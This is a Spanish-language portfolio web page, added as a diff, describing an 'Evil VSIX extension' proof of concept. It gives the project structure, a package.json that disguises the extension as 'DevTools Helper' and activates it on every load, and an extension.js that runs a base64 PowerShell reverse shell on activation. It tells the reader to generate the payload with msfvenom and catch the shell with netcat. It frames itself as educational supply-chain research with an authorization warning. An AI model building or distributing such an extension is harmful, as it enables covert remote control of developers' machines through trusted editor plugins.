@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<!-- 🛠️ PLANTILLA TOOL — duplica este archivo, renómbralo y edita el contenido.
+     Luego añade una entrada en /portfolio/posts.js con la ruta del nuevo archivo. -->
+<title>Evil VSIX extension — Andreco Juarez</title>
+<meta name="description" content="Descripción breve de la herramienta." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="../../static/styles/styles.css" />
+<link rel="stylesheet" href="../../static/styles/article.css" />
+</head>
+<body>
+<div class="grain"></div>
+
+<header class="nav">
+  <a href="../../index.html" class="logo"><span class="bracket">[</span>AndrecoJS<span class="cursor">_</span><span class="bracket">]</span></a>
+  <nav>
+    <a href="../../index.html#posts">publicaciones</a>
+    <a href="../../index.html#contact">contacto</a>
+  </nav>
+</header>
+
+<main class="article">
+  <a class="back" href="../../index.html#posts">← volver a publicaciones</a>
+
+  <header class="meta">
+    <span class="kind">Tool</span>
+    <h1>Evil VSIX extension</h1>
+    <div class="sub">
+      <span>📅 16 Jun 2026</span>
+      <span class="dot-sep">·</span>
+    </div>
+    <div class="tags-mini">
+      <span>Windows</span><span>Reverse Shell</span><span>Extension</span>
+    </div>
+  </header>
+
+  <p>
+    <strong>Evil VSIX Extension</strong> es una extensión VSIX desarrollada como prueba de concepto para evaluar riesgos de seguridad en entornos de desarrollo. Demuestra técnicas de ejecución de código mediante extensiones de VS Code y permite analizar vectores de ataque relacionados con la cadena de suministro de software y la confianza en complementos de terceros.
+  </p>
+
+  <h2>Creacion</h2>
+  <p>
+    Se crea la siguiente estructura de proyecto
+  </p>
+  <pre><code>.
+├── [Content_Types].xml
+└── extension/
+    ├── extension.js
+    └── package.js
+  </code></pre>
+  <p>
+    En el archivo <strong>extension/package.js</strong>
+  </p>
+  <pre><code>{
+  "name": "devtools-helper",
+  "displayName": "DevTools Helper",
+  "version": "1.0.0",
+  "engines": {"vscode": "^1.118.0"},
+  "activationEvents": ["*"],
+  "main": "./extension.js",
+  "contributes": {}
+}</code></pre>
+  <p>Asegurate de tener la version correcta en el parametro version y de que activationEvents este seteado como ["*"] asi ejecutara todo lo del codigo</p>
+  <p>
+    El el archivo <strong>extension/extension.js</strong>
+  </p>
+  <pre><code>const cp = require('child_process');
+exports.activate = function() {
+    cp.exec('powershell -e &lt;BASE64_REVERSE_SHELL&gt;');
+}
+exports.deactivate = function() {}</code></pre>
+  <p>
+    Para generar el Payload puedes usar uso de la herramienta <strong>msfvenom</strong> solo asegurate de encodear el parametro en base64
+  </p>
+
+  <h2>Uso</h2>
+  <p>Ponerse en escucha con netcat</p>
+  <p>Basta con ejecutarlo en el sistema con VSCode</p>
+
+  <h2>Cómo funciona</h2>
+
+<p>
+  Una extensión VSIX es un paquete utilizado por Visual Studio Code para distribuir funcionalidades adicionales.
+  Cuando una extensión es instalada, VS Code interpreta su archivo de configuración y carga el código JavaScript
+  asociado a la extensión.
+</p>
+
+<p>
+  Este comportamiento es legítimo y forma parte del funcionamiento normal del editor. Sin embargo, una extensión
+  maliciosa puede aprovechar el modelo de confianza de VS Code para ejecutar código arbitrario en el sistema de la víctima.
+</p>
+
+<p>
+  En este proyecto se demuestra cómo una extensión aparentemente inofensiva puede utilizar eventos de activación
+  automáticos para ejecutar código tan pronto como VS Code la cargue.
+</p>
+
+<p>
+  Debido a que las extensiones se ejecutan con los permisos del usuario actual, estas pueden interactuar con el
+  sistema operativo, acceder a archivos locales, realizar conexiones de red o ejecutar procesos externos.
+</p>
+
+<p>
+  Este tipo de técnica suele clasificarse como un ataque de cadena de suministro (Supply Chain Attack), ya que
+  el usuario confía en una extensión aparentemente legítima que termina ejecutando acciones no autorizadas.
+</p>
+
+<p>
+  La prueba de concepto presentada tiene fines educativos y de investigación, permitiendo comprender los riesgos
+  asociados a la instalación de extensiones de terceros en entornos de desarrollo.
+</p>
+
+<p>El flujo de ejecución es el siguiente:</p>
+
+<ol>
+  <li>El usuario instala la extensión <code>.vsix</code> en Visual Studio Code.</li>
+  <li>VS Code lee el archivo <code>package.json</code> para identificar el punto de entrada de la extensión.</li>
+  <li>Los eventos definidos en <code>activationEvents</code> determinan cuándo debe cargarse la extensión.</li>
+  <li>Al cumplirse la condición de activación, VS Code ejecuta el archivo <code>extension.js</code>.</li>
+  <li>La función <code>activate()</code> se ejecuta automáticamente con los permisos del usuario actual.</li>
+  <li>El código de la extensión puede interactuar con recursos locales y realizar acciones definidas por el desarrollador.</li>
+  <li>La ejecución ocurre dentro de un contexto considerado confiable por el usuario y por el propio editor.</li>
+</ol>
+
+  <div class="callout warn">
+    <p>Úsalo solo contra objetivos para los que tengas autorización explícita.</p>
+  </div>
+</main>
+
+<footer>
+  <p>© <span id="year"></span> Eduardo Andreco Juarez Salgado</p>
+</footer>
+
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
